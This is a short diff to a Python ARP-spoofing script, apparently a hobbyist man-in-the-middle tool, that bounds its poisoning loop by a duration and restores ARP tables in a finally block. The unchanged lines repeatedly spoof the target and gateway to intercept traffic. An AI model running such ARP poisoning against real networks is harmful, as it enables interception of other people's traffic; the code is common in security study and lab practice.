@@ -32,17 +32,20 @@ def get_arguements():
     return options
 
 
-def run(target, gateway):
+def run(target, gateway, duration_seconds):
+    end_time = time.time() + duration_seconds
+
     count = 2
     try:
-        while True:
+        while time.time() < end_time:
             arpspoof(target, gateway)
             arpspoof(gateway, target)
             print("\r\033[1;35m[+] packets sent = \033[0m" + str(count), end = "")
             count += 2
-            time.sleep(2)
-    except:
-        KeyboardInterrupt
-        print("\n\033[1;32mExiting...\033[0m")
+            remaining = end_time - time.time()
+            if remaining <= 0:
+                break
+            time.sleep(min(2, remaining))
+    finally:
         restore(target, gateway)
 
